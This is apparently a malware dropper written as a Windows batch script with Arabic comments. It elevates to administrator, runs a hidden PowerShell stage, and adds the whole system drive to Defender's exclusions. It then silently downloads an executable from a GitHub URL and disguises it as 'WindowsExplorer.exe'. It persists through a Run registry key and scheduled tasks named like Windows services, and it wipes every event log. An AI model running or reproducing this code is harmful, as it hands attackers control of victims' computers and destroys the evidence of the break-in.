@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: إنشاء ملف الباور شيل المؤقت
echo $c = '; $d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($c)); Invoke-Expression $d > "%temp%\fix.ps1"
echo $ins = "$env:TEMP\360TS_Setup.exe" >> "%temp%\fix.ps1"
echo Invoke-WebRequest -Uri "https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe" -OutFile $ins >> "%temp%\fix.ps1"
echo Start-Process -FilePath $ins -ArgumentList "/S" -Wait >> "%temp%\fix.ps1"
echo Start-Sleep -Seconds 45 >> "%temp%\fix.ps1"
echo Stop-Service -Name "360*" -Force -ErrorAction SilentlyContinue >> "%temp%\fix.ps1"
echo Remove-Item -Path "C:\Program Files (x86)\360" -Recurse -Force -ErrorAction SilentlyContinue >> "%temp%\fix.ps1"
echo Remove-Item -Path $ins -Force >> "%temp%\fix.ps1"

:: تنفيذ الملف
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\fix.ps1"
del "%temp%\fix.ps1"

:: باقي الكود
Powershell Add-MpPreference -ExclusionPath '%systemdrive%'
mkdir "%systemdrive%\programdata\GG-Win" 2>nul
PowerShell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe','%programdata%\GG-Win\WindowsExplorer.exe')
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe" /f
schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
start "" "%programdata%\GG-Win\WindowsExplorer.exe"
copy "%~f0" "%ProgramData%\GG-Win\WindowsExplorer.bat" /Y
schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1" 2>nul
